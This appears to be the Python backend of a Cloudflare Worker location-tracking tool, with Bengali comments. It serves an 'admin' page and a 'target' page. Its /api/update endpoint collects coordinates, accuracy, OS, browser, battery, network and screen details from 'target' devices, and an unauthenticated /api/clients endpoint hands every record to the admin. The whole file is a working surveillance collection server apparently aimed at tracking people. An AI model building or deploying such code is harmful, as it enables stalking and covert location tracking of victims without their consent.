from workers import WorkerEntrypoint, Response
from pathlib import Path
from urllib.parse import urlparse
import json

# ডেটা সাময়িকভাবে রাখার জন্য ডিকশনারি (মেমরি)
clients = {}

class Default(WorkerEntrypoint):
    async def fetch(self, request):
        global clients
        url = urlparse(request.url)
        path = url.path.rstrip("/")

        cors_headers = {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
        }

        # ১. অ্যাডমিন পেজ রুট (/)
        if path in ("", "/") and request.method == "GET":
            admin_file = Path(__file__).parent / "templates" / "admin.html"
            return Response(admin_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})

        # ২. টার্গেট পেজ (/target)
        if path == "/target" and request.method == "GET":
            target_file = Path(__file__).parent / "templates" / "target.html"
            return Response(target_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})

        # ৩. টার্গেট থেকে ডেটা রিসিভ করা (/api/update)
        if path == "/api/update" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("id", "unknown_device")
                
                # নতুন ডেটা সেভ করা (accuracy, network, screen সহ)
                clients[client_id] = {
                    "id": client_id,
                    "lat": data.get("lat"),
                    "lng": data.get("lng"),
                    "accuracy": data.get("accuracy", 0),
                    "os": data.get("os", "Unknown"),
                    "browser": data.get("browser", "Unknown"),
                    "battery": data.get("battery", "N/A"),
                    "network": data.get("network", "N/A"),
                    "screen": data.get("screen", "N/A"),
                    "lastSeen": data.get("time", "")
                }
                return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
            except Exception as e:
                return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})

        # ৪. অ্যাডমিনের জন্য ডেটা রিড করা (/api/clients)
        if path == "/api/clients" and request.method == "GET":
            return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})

        if request.method == "OPTIONS":
            return Response("", headers=cors_headers)

        return Response("Not found", status=404)
